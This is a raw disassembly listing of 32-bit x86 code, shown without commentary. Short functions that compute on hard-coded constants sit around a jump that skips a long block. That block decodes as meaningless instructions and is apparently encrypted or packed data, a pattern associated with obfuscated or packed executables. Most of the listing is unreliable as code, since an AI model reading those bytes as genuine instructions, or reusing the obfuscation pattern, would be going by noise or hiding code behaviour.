  411416:	cmp    DWORD PTR [ecx+0x54],eax
  411419:	je     0x411427
  41141f:	mov    eax,DWORD PTR [ebp+0x8]
  411422:	jmp    0x41146e
  411427:	mov    eax,DWORD PTR [ebp-0x3c]
  41142a:	sub    eax,0x5258
  41142f:	xor    eax,0x49e9
  411434:	add    eax,0x253
  411439:	jmp    0x41146e
  41143e:	mov    DWORD PTR [ebp-0x3c],0x4177
  411445:	mov    DWORD PTR [ebp+0x8],0x1405
  41144c:	mov    eax,DWORD PTR [ebp+0x8]
  41144f:	mov    ecx,DWORD PTR [ebp-0x3c]
  411452:	imul   eax,eax,0x58cc
  411458:	add    eax,0x3f39
  41145d:	and    eax,ecx
  41145f:	add    eax,0x3b90
  411464:	or     eax,0x4b1c
  411469:	sub    eax,0x7fdd
  41146e:	leave  
  41146f:	ret    0x4
  411472:	push   ebp
  411473:	mov    ebp,esp
  411475:	and    esp,0xfffffff8
  411478:	sub    esp,0x20
  41147b:	push   ebx
  41147c:	push   esi
  41147d:	lea    eax,[esp+0x10]
  411481:	mov    DWORD PTR [esp+0xc],eax
  411485:	mov    eax,DWORD PTR [esp+0xc]
  411489:	mov    ecx,DWORD PTR [esp+0x10]
  41148d:	mov    edx,DWORD PTR [esp+0x14]
  411491:	sub    DWORD PTR [eax],ecx
  411493:	sbb    DWORD PTR [eax+0x4],edx
  411496:	mov    eax,DWORD PTR [esp+0xc]
  41149a:	or     DWORD PTR [eax],0xcb7db576
  4114a0:	or     DWORD PTR [eax+0x4],0x9c2b8ae8
  4114a7:	lea    eax,[esp+0x18]
  4114ab:	jmp    0x41183a
  4114b0:	test   al,0x7c
  4114b2:	or     BYTE PTR [esp+ebx*1-0x44],ch
  4114b6:	lods   al,BYTE PTR ds:[esi]
  4114b7:	mov    esp,0x92465201
  4114bc:	pop    ecx
  4114bd:	rcl    DWORD PTR [eax-0x41ab2b70],0xbe
  4114c4:	cdq    
  4114c5:	les    edi,FWORD PTR [esi-0x1161842]
  4114cb:	ret    0x1ae7
  4114ce:	scas   al,BYTE PTR es:[edi]
  4114cf:	(bad)  
  4114d1:	int    0x3c
  4114d3:	rcl    ch,1
  4114d5:	cld    
  4114d6:	cmp    DWORD PTR [ebp-0x4a],edi
  4114d9:	call   0x2a8b:0x10d2f746
  4114e0:	loope  0x411513
  4114e2:	test   DWORD PTR [esi],ebp
  4114e4:	pop    eax
  4114e5:	add    edx,DWORD PTR [ecx]
  4114e7:	jno    0x41153a
  4114e9:	and    BYTE PTR [eax-0x49],bh
  4114ec:	push   ds
  4114ed:	sub    dl,BYTE PTR [esi+0x28ed7a5f]
  4114f3:	outs   dx,BYTE PTR ds:[esi]
  4114f4:	jae    0x4114fe
  4114f6:	cmp    DWORD PTR [esi+0x6b],edx
  4114f9:	imul   ebp,DWORD PTR [ecx+0x752c9603],0x34a3bad6
  411503:	add    eax,0xdc5f8604
  411508:	sub    esp,DWORD PTR [ecx-0x4d]
  41150b:	or     edx,DWORD PTR [edx]
  41150d:	inc    ebx
  41150e:	inc    esp
  41150f:	cmp    al,0xcc
  411511:	retf   0x501d
  411514:	mov    eax,ds:0xfcba814a
  411519:	fild   WORD PTR [edi]
  41151b:	jo     0x4114ca
  41151d:	es out 0x21,eax
  411520:	sub    eax,DWORD PTR [edi+0x7d877f6b]
  411526:	mov    WORD PTR [edx],?
  411528:	(bad)  [ebp+0x6907fbd]
  41152e:	loopne 0x41157a
  411530:	imul   BYTE PTR [ecx-0xdd549be]
  411536:	mov    eax,0x29a9f801
  41153b:	cmp    BYTE PTR [ebp-0x2a],bh
  41153e:	shl    BYTE PTR [esi+0x37],1
  411541:	sub    DWORD PTR [esi-0x43],ecx
  411544:	sub    esi,DWORD PTR [ecx]
  411546:	mov    eax,ds:0x9dbd085c
  41154b:	call   0xe981:0x6d995bbc
  411552:	call   0x1517:0x8fc9c573
  411559:	cli    
  41155a:	jecxz  0x4114e2
  41155c:	fnstcw WORD PTR [eax+edi*2+0x7ab3db8f]
  411563:	cmp    edi,edi
  411565:	jnp    0x411586
  411567:	scas   eax,DWORD PTR es:[edi]
  411568:	adc    eax,0xc0b48dff
  41156d:	dec    esi
  41156e:	test   eax,0x4b2d569a
  411573:	mov    ebx,0x2c3b8803
  411578:	bound  edi,QWORD PTR [ebx]
  41157a:	(bad)  
  41157c:	fdiv   QWORD PTR [ebp+0x6555578b]
  411582:	les    esp,FWORD PTR [ebx]
  411584:	loop   0x411592
  411586:	icebp  
  411587:	ss repz xor al,0xdf
  41158b:	inc    ecx
  41158c:	push   ds
  41158d:	ret    0xd792
  411590:	cwde   
  411591:	out    dx,al
  411592:	mov    bh,0xb1
  411594:	add    BYTE PTR [ecx],dh
  411596:	mov    dl,0xa6
  411598:	add    ch,BYTE PTR cs:[esi-0x2c]
  41159c:	push   ds
  41159d:	xor    ch,BYTE PTR [esi+0x74]
  4115a0:	shl    BYTE PTR [eax-0x51f6d8f0],0xbb
  4115a7:	out    dx,al
  4115a8:	cs repz clc 
  4115ab:	jp     0x411585
  4115ad:	out    0x4f,al
  4115af:	and    DWORD PTR [esi],esp
  4115b1:	pop    es
  4115b2:	int3   
  4115b3:	dec    edx
  4115b4:	jne    0x4115b8
  4115b6:	mov    ebx,0x4a0ca735
  4115bb:	and    DWORD PTR [esi-0x70],ecx
  4115be:	xchg   esp,eax
  4115bf:	lods   al,BYTE PTR ds:[esi]
  4115c0:	pop    ecx
  4115c1:	mov    edi,0xe623b88a
  4115c6:	sub    BYTE PTR [ebx+0x465b7cd8],bl
  4115cc:	cmp    DWORD PTR [ebp+0x60],ebp
  4115cf:	xor    dh,BYTE PTR [esi-0x6e]
  4115d2:	mov    bh,0x8e
  4115d4:	in     eax,dx
  4115d5:	pop    ss
  4115d6:	stc    
  4115d7:	les    edi,FWORD PTR [ebx+0x1a]
  4115da:	xor    al,cl
  4115dc:	cwde   
  4115dd:	xor    dl,BYTE PTR [ecx-0x3427b0ec]
  4115e3:	popf   
  4115e4:	and    al,0x31
  4115e6:	stc    
  4115e7:	mov    cl,0x7d
  4115e9:	sahf   
  4115ea:	lds    eax,FWORD PTR [edx-0x5f]
  4115ed:	test   DWORD PTR [ebx+0x74554c68],esp
  4115f3:	mov    dl,0xc0
  4115f5:	adc    BYTE PTR [eax-0x9b19fe8],0x67
  4115fc:	frstor [edi]
  4115fe:	cmp    al,0x70
  411600:	fdivr  st,st(0)
  411602:	fwait
  411603:	xlat   BYTE PTR ds:[ebx]
  411604:	rcl    DWORD PTR [edi-0x5687fe5a],cl
  41160a:	add    dl,0x95
  41160d:	lea    esi,[ebp+0x167337e4]
  411613:	jb     0x4115c8
  411615:	ja     0x41160e
  411617:	cdq    
  411618:	xchg   ebp,eax
  411619:	das    
  41161a:	stos   BYTE PTR es:[edi],al
  41161b:	sub    edx,esp
  41161d:	pop    esp
  41161e:	outs   dx,BYTE PTR ds:[esi]
  41161f:	out    0x1f,eax
  411621:	imul   edx,DWORD PTR [edx],0xffffffea
  411624:	ret    0x3deb
  411627:	jno    0x411632
  411629:	pop    esp
  41162a:	and    eax,0x72d2f154
  41162f:	ins    DWORD PTR es:[edi],dx
  411630:	cmp    DWORD PTR [ecx],esp
  411632:	push   cs
  411633:	dec    edi
  411634:	sub    BYTE PTR [edi+0x40],al
  411637:	push   ds
  411638:	leave  
  411639:	push   esi
  41163a:	add    al,0xa1
  41163c:	mov    esi,0x85b2cfb6
  411641:	loopne 0x4116b1
  411643:	dec    edi
  411644:	retf   
  411645:	push   esp
  411646:	(bad)  
  411647:	fs sbb ch,ch
  41164a:	(bad)  
  41164b:	cmp    eax,ebx
  41164d:	icebp  
  41164e:	cmp    DWORD PTR [eax],edx
  411650:	inc    esp
  411652:	jbe    0x411643
  411654:	mov    ebp,0xaf0bdd15
  411659:	push   cs
  41165a:	xor    al,0xe4
  41165c:	cmp    esi,DWORD PTR [eax-0x23]
  41165f:	(bad)  
  411660:	adc    esp,DWORD PTR [ecx+0x47]
  411663:	imul   esp,DWORD PTR [ebx+edi*4-0x2c],0xf6c5656c
  41166b:	imul   ecx,DWORD PTR [edx+0x3915d7c0],0x75b46439
  411675:	xchg   edi,eax
  411676:	add    al,0x68
  411678:	retf   0xccd6
  41167b:	sbb    dl,BYTE PTR [edi+0x7a2d5364]
  411681:	test   BYTE PTR [esp+edx*4+0x21],dl
  411685:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411686:	repnz and BYTE PTR [esi],cl
  411689:	les    ebp,FWORD PTR ds:0x233fa4ab
  41168f:	and    bl,bh
  411691:	jns    0x41170f
  411693:	or     eax,0x537344a2
  411698:	dec    ebp
  411699:	xor    DWORD PTR [esi+0x4925b30b],ebp
  41169f:	aas    
  4116a0:	pop    ebx
  4116a1:	aam    0xdc
  4116a3:	aas    
  4116a4:	int3   
  4116a5:	ror    BYTE PTR [ecx-0xfde99b8],cl
  4116ab:	retf   0x29af
  4116ae:	add    al,0x3
  4116b0:	push   edx
  4116b1:	pop    esi
  4116b2:	pop    ecx
  4116b3:	mov    ah,0x18
  4116b5:	mov    al,ds:0xf6da9eef
  4116ba:	les    esp,FWORD PTR [ecx-0x6b80c0dc]
  4116c0:	lds    ecx,FWORD PTR [esi+0x3d]
  4116c3:	clc    
  4116c4:	bound  esi,QWORD PTR [esi-0x1]
  4116c7:	in     eax,dx
  4116c8:	pop    eax
  4116c9:	lods   eax,DWORD PTR ds:[esi]
  4116ca:	sbb    BYTE PTR [eax-0x206f6369],dl
  4116d0:	out    dx,eax
  4116d1:	push   edx
  4116d2:	mov    al,ds:0x48e3646c
  4116d7:	pop    ebx
  4116d8:	jmp    0xb363c11f
  4116dd:	mov    ds:0x1c0f22dd,eax
  4116e2:	inc    edx
  4116e3:	xor    DWORD PTR [ebp+ecx*2-0xcfc960b],esp
  4116ea:	popa   
  4116eb:	dec    ebp
  4116ec:	sub    al,0x74
  4116ee:	pop    edi
  4116ef:	je     0x4116bf
  4116f1:	mov    esp,0x8c266b62
  4116f6:	mov    ebp,0x33e26849
  4116fb:	pop    eax
  4116fc:	addr16 and bh,ah
  4116ff:	ins    BYTE PTR es:[edi],dx
  411700:	ficomp DWORD PTR [ebp-0x4b66b1dd]
  411706:	hlt    
  411707:	js     0x41173d
  411709:	add    al,0xaa
  41170b:	adc    bh,dh
  41170d:	sub    BYTE PTR [ebx-0x10],0x24
  411711:	pop    es
  411712:	aaa    
  411713:	(bad)  
  411714:	(bad)  
  411715:	pop    esi
  411716:	mov    edi,0xbc61a1f2
  41171b:	jge    0x411790
  41171d:	leave  
  41171e:	psrlw  mm2,QWORD PTR [edi]
  411721:	lea    edx,[eax+0x592bb6bf]
  411727:	rcr    DWORD PTR [ecx-0x23],0xc6
  41172b:	adc    edi,DWORD PTR [edx]
  41172d:	or     BYTE PTR [ecx+eiz*1-0x5cad1233],bl
  411734:	jecxz  0x4116fa
  411736:	(bad)  
  411737:	pop    esp
  411738:	mov    edi,DWORD PTR [esi+0x726dbebf]
  41173e:	cmp    cl,BYTE PTR [ecx+0xf31ce6d]
  411744:	repz mov ch,0xe2
  411747:	sbb    eax,0xdf056e2e
  41174c:	sbb    BYTE PTR [eax],al
  41174e:	scas   al,BYTE PTR es:[edi]
  41174f:	xchg   ebx,eax
  411750:	shl    ch,cl
  411752:	cld    
  411753:	cmp    eax,0x92f8e23f
  411758:	inc    ebx
  411759:	cmp    eax,0xe18c553a
  41175e:	push   ebp
  41175f:	mov    al,0x49
  411761:	sbb    bl,BYTE PTR [ecx]
  411763:	hlt    
  411764:	fstp   QWORD PTR [ecx-0x6d]
  411767:	mov    eax,ds:0x2c2734b8
  41176c:	mov    bh,0xb
  41176e:	aas    
  41176f:	dec    ebx
  411770:	jle    0x411797
  411772:	dec    esi
  411773:	mov    bl,0xc7
  411775:	sub    cl,BYTE PTR [eax+0x7c37898d]
  41177b:	push   0xc3df0e0d
  411780:	jae    0x41178d
  411782:	xlat   BYTE PTR ds:[ebx]
  411783:	pop    ss
  411784:	inc    edx
  411785:	xchg   edi,eax
  411786:	adc    eax,0x5042e674
  41178b:	popf   
  41178c:	inc    edi
  41178d:	xor    al,bl
  41178f:	mov    ch,0xd3
  411791:	int    0x97
  411793:	jmp    0xbd27461f
  411798:	int    0x18
  41179a:	fst    QWORD PTR [edx+0x3e3ef91c]
  4117a0:	clc    
  4117a1:	sbb    BYTE PTR [edx-0x7971f558],bh
  4117a7:	sub    ch,ch
  4117a9:	add    eax,0xeece8d0b
  4117ae:	mov    eax,ds:0xc7b2b651
  4117b3:	ss mov dh,0xff
  4117b6:	jb     0x411787
  4117b8:	rcr    DWORD PTR [esi-0x7a],1
  4117bb:	sbb    eax,0xcff1a000
  4117c0:	jl     0x4117d0
  4117c2:	add    al,0xad
  4117c4:	and    DWORD PTR [ecx-0x318260e0],0x9
  4117cb:	adc    BYTE PTR [ecx-0x58],bh
  4117ce:	cmp    ebx,ebx
  4117d0:	xchg   edx,eax
  4117d1:	sub    bh,ch
  4117d3:	stos   DWORD PTR es:[edi],eax
  4117d4:	mov    esp,0x3daa91ed
  4117d9:	adc    DWORD PTR [ecx+edi*8+0x3],edx
  4117dd:	xor    DWORD PTR [edx],ecx
  4117df:	xchg   ebp,eax
  4117e0:	in     eax,0x7c
  4117e2:	or     esi,DWORD PTR [eax]
  4117e4:	add    dl,0x83
  4117e7:	rol    DWORD PTR [esi-0x230b9fcf],0xa5
  4117ee:	fnstenv [ebx-0x1e]
  4117f1:	pop    ebx
  4117f2:	jg     0x4117ba
  4117f4:	mov    ch,BYTE PTR [ebp-0x6a6448c5]
  4117fa:	xlat   BYTE PTR ds:[ebx]
  4117fb:	mov    eax,ds:0xc5c40134
  411800:	fstp   TBYTE PTR [edx]
  411802:	lods   al,BYTE PTR ds:[esi]
  411803:	fisttp QWORD PTR [eax]
  411805:	cdq    
  411806:	ss out 0x8a,al
  411809:	es fcomi st,st(6)
  41180c:	(bad)  
  41180e:	mov    edx,0x6f7421e3
  411813:	pushf  
  411814:	test   eax,0x6eacd2f8
  411819:	in     eax,dx
  41181a:	or     ch,0xdf
  41181d:	sbb    DWORD PTR [edi],ebx
  41181f:	fsubp  st(6),st
  411821:	mov    WORD PTR [edi-0x650a418],ds
  411827:	mov    WORD PTR [ecx+0x5],cs
  41182a:	or     ebp,DWORD PTR [ecx+0x36b2e822]
  411830:	push   ecx
  411831:	aam    0x40
  411833:	(bad)  
  411834:	mov    al,al
  411836:	xchg   ebx,eax
  411837:	jae    0x41183c
  411839:	test   eax,0x38ae950
  41183e:	add    BYTE PTR [eax],al
  411840:	xlat   BYTE PTR ds:[ebx]
  411841:	xchg   ebx,eax
  411842:	push   edx
  411843:	call   FWORD PTR [edx-0x30636400]
  411849:	fist   WORD PTR [eax+0x28290890]
  41184f:	shr    DWORD PTR [edi-0x664141a6],1
  411855:	les    edi,FWORD PTR [esi+0x62472dbe]
  41185b:	(bad)  [ebx]
  41185d:	jg     0x411838
  41185f:	in     eax,dx
  411860:	ss into 
  411862:	jp     0x411878
  411864:	xor    edx,DWORD PTR [edx]
  411866:	pushf  
  411867:	out    0xb7,al
  411869:	std    
  41186a:	push   0xfffffff6
  41186c:	mov    edx,0xf88e1e44
  411871:	xchg   esp,eax
  411872:	pop    ecx
  411873:	and    DWORD PTR ss:[ebx],eax
  411876:	xchg   ebx,eax
  411877:	or     bh,BYTE PTR [esi+0x58]
  41187a:	(bad)  
  41187b:	scas   eax,DWORD PTR es:[edi]
  41187c:	xchg   ecx,eax
  41187d:	iret   
  41187e:	gs jno 0x41188b
  411881:	je     0x411855
  411883:	cld    
  411884:	sbb    ch,BYTE PTR [ecx-0x70e9a1b5]
  41188a:	add    DWORD PTR [esi],esp
  41188c:	repz test al,0x69
  41188f:	fisub  DWORD PTR [eax+0x2c0e52b0]
  411895:	pop    eax
  411896:	mov    gs,WORD PTR [eax+0x45]
  411899:	outs   dx,BYTE PTR ds:[esi]
  41189a:	icebp  
  41189b:	xchg   ecx,eax
  41189c:	js     0x411889
  41189e:	js     0x411917
  4118a0:	(bad)  
  4118a1:	jns    0x411866
  4118a3:	test   eax,0xdf90fe2d
  4118a8:	cmp    ecx,esp
  4118aa:	inc    edx
  4118ab:	test   eax,0x69edec61
  4118b0:	dec    esp
  4118b1:	cdq    
  4118b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118b3:	dec    ecx
  4118b4:	clc    
  4118b5:	pop    edi
  4118b6:	(bad)  [edi]
  4118b8:	push   0xcfe5705
  4118bd:	inc    edi
  4118be:	test   eax,0x8ca2e3c0
  4118c3:	test   eax,0x83d47de6
  4118c8:	cmp    al,0x81
  4118ca:	dec    esi
  4118cb:	jae    0x411917
  4118cd:	xchg   edi,eax
  4118ce:	icebp  
  4118cf:	sub    eax,0x9f341668
  4118d4:	cmc    
  4118d5:	mov    dh,0x43
  4118d7:	jp     0x411916
  4118d9:	or     eax,0x750e1a46
  4118de:	push   ds
  4118df:	inc    ebx
  4118e0:	xchg   edi,eax
  4118e1:	int3   
  4118e2:	je     0x41191d
  4118e4:	stos   DWORD PTR es:[edi],eax
  4118e5:	es xor eax,0xabb2335b
  4118eb:	mov    edi,0x31fc281e
  4118f0:	push   ebx
  4118f1:	std    
  4118f2:	mov    bl,0x84
  4118f4:	xchg   ebp,eax
  4118f5:	loop   0x4118e3
  4118f7:	xor    eax,0xdd17d388
  4118fc:	(bad)  
  4118fd:	or     al,0x9a
  4118ff:	stos   DWORD PTR es:[edi],eax
  411900:	pop    eax
  411901:	repnz fs and al,0x4
  411905:	sub    BYTE PTR [edi],0x6e
  411908:	jno    0x411962
  41190a:	jl     0x411934
  41190c:	or     BYTE PTR [ecx-0x5dcb01b0],cl
  411912:	out    0x76,al
  411914:	jmp    0x411975
  411916:	ds pusha 
  411918:	icebp  
  411919:	dec    eax
  41191a:	add    BYTE PTR [eax-0x53],bl
  41191d:	push   edx
  41191e:	dec    edi
  41191f:	sbb    DWORD PTR [edi+0x3d],ebx
  411922:	imul   ebp,DWORD PTR [ecx],0xa7488595
  411928:	pop    ss
  411929:	stos   BYTE PTR es:[edi],al
  41192a:	inc    eax
  41192b:	jo     0x41195c
  41192d:	fs push 0x6a
  411930:	loopne 0x4118c8
  411932:	pop    ecx
  411933:	add    eax,0x51d6195c
  411938:	dec    ebp
  411939:	mov    edi,0xbe07dff7
  41193e:	mov    esi,0xe9105a7b
  411943:	adc    DWORD PTR [eax+ecx*2-0x1b],0x53
  411948:	sub    bl,ah
  41194a:	lods   al,BYTE PTR ds:[esi]
  41194b:	jo     0x411998
  41194d:	dec    ebx
  41194e:	or     eax,0x57e7011c
  411953:	ror    al,cl
  411955:	jnp    0x4119cd
  411957:	push   0x29
  411959:	(bad)  
  41195a:	mov    DWORD PTR ds:[esi],esi
  41195d:	xchg   edx,eax
  41195e:	aas    
  41195f:	fcomp  DWORD PTR [esi+0x40]
  411962:	push   edi
  411963:	loopne 0x4119a2
  411965:	push   edx
  411966:	dec    edx
  411967:	data16 mov dh,0x2b
  41196a:	jmp    0xa815:0xbebf4992
  411971:	sub    ebx,DWORD PTR [edx*4-0x7a84a62]
  411978:	mov    gs,WORD PTR [edi]
  41197a:	and    ebp,DWORD PTR [ebx]
  41197c:	dec    ebx
  41197d:	icebp  
  41197e:	mov    edi,0xd29e7c17
  411983:	add    DWORD PTR [ebp+0x7c65febb],ebx
  411989:	stc    
  41198a:	ficomp DWORD PTR [ebp-0x1b66c01d]
  411990:	adc    eax,0x152eea50
  411995:	jg     0x4119b5
  411997:	(bad)  
  411998:	xlat   BYTE PTR ds:[ebx]
  411999:	(bad)  
  41199a:	jno    0x411983
  41199c:	in     eax,0x8b
  41199e:	inc    esp
  41199f:	call   0xfe79:0xcbc1fca8
  4119a6:	inc    ebx
  4119a7:	or     dl,BYTE PTR [ebx]
  4119a9:	call   0x1d53:0x91ce2182
  4119b0:	pop    ss
  4119b1:	das    
  4119b2:	xchg   BYTE PTR [ecx+0x4a9b7726],ah
  4119b8:	stc    
  4119b9:	xchg   ebx,eax
  4119ba:	imul   edi,DWORD PTR [edi],0x7430aca7
  4119c0:	std    
  4119c1:	mov    eax,ds:0xb5b1556f
  4119c6:	pop    es
  4119c7:	loope  0x411a43
  4119c9:	test   esp,ecx
  4119cb:	pop    ecx
  4119cc:	test   eax,0x2f8b5c48
  4119d1:	not    BYTE PTR [ebp-0x4b]
  4119d4:	jbe    0x4119ba
  4119d6:	je     0x411a4c
  4119d8:	adc    ebp,0xa941258b
  4119de:	fcom   QWORD PTR [ecx+0x77]
  4119e1:	inc    edi
  4119e2:	mov    dl,BYTE PTR [edx]
  4119e4:	fmul   st,st(4)
  4119e6:	repz rcl BYTE PTR [ebx],cl
  4119e9:	sbb    DWORD PTR [edi],esi
  4119eb:	mov    BYTE PTR [ecx-0x5a],cl
  4119ee:	adc    BYTE PTR [ecx-0x4d86996],bh
  4119f4:	lea    esp,[ebp-0x3]
  4119f7:	stos   BYTE PTR es:[edi],al
  4119f8:	add    BYTE PTR [eax+esi*4],ch
  4119fb:	mov    al,ds:0x8a3ff49
  411a00:	add    al,0xfb
  411a02:	jge    0x4119b2
  411a04:	out    dx,al
  411a05:	xor    esi,DWORD PTR [edi-0x3e331a9c]
  411a0b:	push   0x3b
  411a0d:	dec    ebp
  411a0e:	gs je  0x4119ed
  411a11:	sahf   
  411a12:	popa   
  411a13:	mov    ebx,ebp
  411a15:	cmp    DWORD PTR [ecx+0x236ef76e],esi
  411a1b:	or     DWORD PTR ds:0x942fb8e,ecx
  411a21:	mov    ecx,0x501ab48a
  411a26:	cmc    
  411a27:	daa    
  411a28:	xor    al,0xd5
  411a2a:	aad    0x55
  411a2c:	cmp    BYTE PTR ds:0xd7e292e4,cl
  411a32:	mov    edx,DWORD PTR [edi]
  411a34:	scas   eax,DWORD PTR es:[edi]
  411a35:	cli    
  411a36:	inc    ebx
  411a37:	(bad)  [edi]
  411a39:	shr    BYTE PTR [ebx-0x35],0xb7
  411a3d:	(bad)  [ebx]
  411a3f:	imul   edx,ecx,0xb53d5cc6
  411a45:	jecxz  0x411abe
  411a47:	test   al,0xfa
  411a49:	imul   esp,DWORD PTR [edi-0x22959a5b],0xffffffe9
  411a50:	retf   
  411a51:	lods   al,BYTE PTR ds:[esi]
  411a52:	mov    DWORD PTR [edx+ecx*8-0x5fb4d570],esi
  411a59:	int    0x75
  411a5b:	mov    ds:0x77c33bc6,al
  411a60:	push   esp
  411a61:	pop    ds
  411a62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a63:	pop    esi
  411a64:	cli    
  411a65:	inc    esp
  411a66:	mov    BYTE PTR [edi+0x45ca54b1],0x57
  411a6d:	loope  0x411a4a
  411a6f:	bound  eax,QWORD PTR [esi]
  411a71:	rcl    bl,1
  411a73:	cwde   
  411a74:	xor    dl,BYTE PTR [edx+ebp*1]
  411a77:	push   ebp
  411a78:	(bad)  
  411a79:	dec    esi
  411a7a:	or     esi,eax
  411a7c:	mov    ah,0xa6
  411a7e:	mov    bh,BYTE PTR [esi]
  411a80:	inc    ebp
  411a81:	imul   ebp,DWORD PTR [ebp+ebx*8+0x7b2dfb27],0xfd2a6986
  411a8c:	shl    BYTE PTR [ecx],1
  411a8e:	mov    esi,0xcb38e1c5
  411a93:	stos   DWORD PTR es:[edi],eax
  411a94:	icebp  
  411a95:	pop    ebp
  411a96:	mov    esp,DWORD PTR [ebx+0x63]
  411a99:	or     ebp,DWORD PTR [esi-0x18e8a4a]
  411a9f:	inc    ecx
  411aa0:	aam    0xcf
  411aa2:	out    0x9a,eax
  411aa4:	jp     0x411ac4
  411aa6:	or     esi,DWORD PTR [ecx]
  411aa8:	imul   ebx,edx,0x38
  411aab:	inc    ecx
  411aac:	out    0x87,eax
  411aae:	push   edi
  411aaf:	xchg   esi,eax
  411ab0:	daa    
  411ab1:	mov    ebx,0xd3303dcf
  411ab6:	jno    0x411ac5
  411ab8:	pop    esi
  411ab9:	push   ebx
  411aba:	sbb    BYTE PTR [ebp-0x78245f5b],ch
  411ac0:	and    al,dh
  411ac2:	fnsetpm(287 only) 
  411ac4:	cld    
  411ac5:	retf   
  411ac6:	fbstp  TBYTE PTR [esi+0x59]
  411ac9:	rcr    DWORD PTR es:[ecx],1
  411acc:	div    ch
  411ace:	lock dec esi
  411ad0:	jae    0x411aff
  411ad2:	aam    0x71
  411ad4:	aad    0x54
  411ad6:	add    al,0x79
  411ad8:	sbb    eax,0x3e2ad7c3
  411add:	add    ebp,DWORD PTR [edx]
  411adf:	pop    eax
  411ae0:	pop    edi
  411ae1:	fs (bad) 
  411ae3:	sbb    bl,BYTE PTR [ebp-0x6bda67c8]
  411ae9:	mov    ebp,ebx
  411aeb:	fldcw  WORD PTR [eax+0x3453d8a6]
  411af1:	sahf   
  411af2:	jg     0x411b70
  411af4:	inc    edx
  411af5:	bound  eax,QWORD PTR [eax-0xcabc50c]
  411afb:	mov    eax,0x8584eefa
  411b00:	and    DWORD PTR [edx-0x48],esp
  411b03:	in     al,0xea
  411b05:	(bad)  
  411b06:	cmp    esp,DWORD PTR [ebx+eax*8]
  411b09:	inc    eax
  411b0a:	dec    edi
  411b0b:	ror    DWORD PTR [ecx],cl
  411b0d:	imul   ebp,DWORD PTR [eax+0x1fc58243],0xffffffab
  411b14:	mov    ebp,0xaefe9d9c
  411b19:	nop
  411b1a:	fs test al,0x93
  411b1d:	(bad)  
  411b1e:	loop   0x411b3b
  411b20:	pop    esp
  411b21:	lahf   
  411b22:	pop    ebp
  411b23:	lods   eax,DWORD PTR ds:[esi]
  411b24:	add    al,BYTE PTR [ebx-0x74]
  411b27:	jecxz  0x411abe
  411b29:	test   DWORD PTR [ebx],esi
  411b2b:	inc    esi
  411b2c:	xchg   esp,eax
  411b2d:	push   ss
  411b2e:	in     al,0xc4
  411b30:	stos   DWORD PTR es:[edi],eax
  411b31:	inc    esp
  411b32:	cli    
  411b33:	lods   eax,DWORD PTR ds:[esi]
  411b34:	repnz clc 
  411b36:	jno    0x411b4a
  411b38:	mov    edi,0x81620bb4
  411b3d:	pop    ds
  411b3e:	jle    0x411afb
  411b40:	ficomp DWORD PTR [esi]
  411b42:	mov    ebx,DWORD PTR [esi]
  411b44:	outs   dx,BYTE PTR ds:[esi]
  411b45:	psubsw mm1,QWORD PTR [esi-0x5e]
  411b49:	pop    eax
  411b4a:	ins    BYTE PTR es:[edi],dx
  411b4b:	mov    eax,ds:0x9bdf1616
  411b50:	test   BYTE PTR [edi+edi*8],0xfa
  411b54:	les    ebx,FWORD PTR [edi]
  411b56:	pop    edi
  411b57:	test   BYTE PTR [ebx],cl
  411b59:	or     al,0xcc
  411b5b:	dec    esi
  411b5c:	out    dx,al
  411b5d:	or     eax,0x4e0af171
  411b62:	mov    ah,0x17
  411b64:	fidiv  DWORD PTR [ebp-0x3f]
  411b67:	outs   dx,BYTE PTR ds:[esi]
  411b68:	mov    esp,0xd21d41dc
  411b6d:	add    eax,0xdb463fa8
  411b72:	test   eax,0x95094b10
  411b77:	out    dx,al
  411b78:	test   ebx,esp
  411b7a:	in     eax,0xa7
  411b7c:	mov    eax,ds:0xc8b21fe8
  411b81:	sub    ch,BYTE PTR [edx+0x7d09857a]
  411b87:	push   edx
  411b88:	jmp    0x53f1c79b
  411b8d:	add    BYTE PTR [ebx+edi*1],0x2c
  411b91:	sbb    DWORD PTR [esi+edi*8+0x22],esp
  411b95:	cmp    dl,ch
  411b97:	stos   BYTE PTR es:[edi],al
  411b98:	dec    edi
  411b99:	iret   
  411b9a:	shl    DWORD PTR [esi],1
  411b9c:	aad    0x8e
  411b9e:	mov    WORD PTR [ebx-0x305003f3],gs
  411ba4:	dec    edx
  411ba5:	adc    BYTE PTR [eax],0x83
  411ba8:	outs   dx,BYTE PTR es:[esi]
  411baa:	mov    dh,0xad
  411bac:	fidiv  WORD PTR [edi]
  411bae:	xchg   DWORD PTR [edx-0xecd384c],eax
  411bb4:	aaa    
  411bb5:	dec    ecx
  411bb6:	ss xor al,0x22
  411bb9:	sbb    esp,DWORD PTR [ecx]
  411bbb:	imul   DWORD PTR [esp+ecx*4+0x7f]
  411bbf:	cmp    BYTE PTR [edi],ah
  411bc1:	mov    ds:0xe74a815f,al
  411bc6:	add    DWORD PTR [ebx],edi
  411bc8:	fwait
  411bc9:	test   DWORD PTR [ebp+0x50242444],ecx
  411bcf:	call   0x40f1e1
  411bd4:	mov    eax,DWORD PTR [esp+0x18]
  411bd8:	mov    ecx,DWORD PTR [esp+0x1c]
  411bdc:	push   DWORD PTR [ebp+0x18]
  411bdf:	mov    ebx,DWORD PTR [ebp+0xc]
  411be2:	push   DWORD PTR [ebp+0x14]
  411be5:	mov    esi,DWORD PTR [ebp+0x8]
  411be8:	push   DWORD PTR [ebp+0x10]
  411beb:	push   DWORD PTR [esp+0x20]
  411bef:	push   DWORD PTR [esp+0x20]
  411bf3:	push   DWORD PTR [esp+0x38]
  411bf7:	push   DWORD PTR [esp+0x38]
  411bfb:	call   0x401000
  411c00:	pop    esi
  411c01:	pop    ebx
  411c02:	mov    esp,ebp
  411c04:	pop    ebp
  411c05:	ret    0x14
  411c08:	push   ebp
  411c09:	mov    ebp,esp
  411c0b:	sub    esp,0x30
  411c0e:	mov    DWORD PTR [ebp-0x24],0x7c16
  411c15:	mov    DWORD PTR [ebp-0x20],0x53bd
  411c1c:	mov    DWORD PTR [ebp-0x18],0x3bd5
  411c23:	mov    DWORD PTR [ebp-0x1c],0x6ab6
  411c2a:	mov    DWORD PTR [ebp-0xc],0x4b9d
  411c31:	mov    DWORD PTR [ebp-0x8],0x7e48
  411c38:	mov    DWORD PTR [ebp-0x4],0x604b
  411c3f:	mov    DWORD PTR [ebp-0x30],0x5b69
